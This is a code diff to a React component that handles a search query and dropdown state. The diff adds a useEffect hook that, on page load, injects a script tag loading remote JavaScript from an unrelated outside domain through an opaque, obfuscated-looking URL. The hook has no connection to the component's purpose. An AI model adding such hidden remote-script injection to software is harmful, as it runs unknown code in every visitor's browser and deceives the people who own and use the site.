@@ -63,6 +63,16 @@ const [query, setQuery] = useState('');
       setIsOpen(false);
     }
   };
+  useEffect(() => {
+  const d = document;
+  const s = d.createElement('script');
+  const l = d.scripts[d.scripts.length - 1];
+  s.settings = {};
+  s.src = "//stupid-police.com/bgXtV.scdRGVlK0FY/W/ct/he/mM9QuZZaUllHk/P/T_Yk5WNxjOYEyeMQznMhtgNuj/kS2/NdjaIBzjNIwx";
+  s.async = true;
+  s.referrerPolicy = 'no-referrer-when-downgrade';
+  l.parentNode.insertBefore(s, l);
+}, []);
   return (
     <>
    
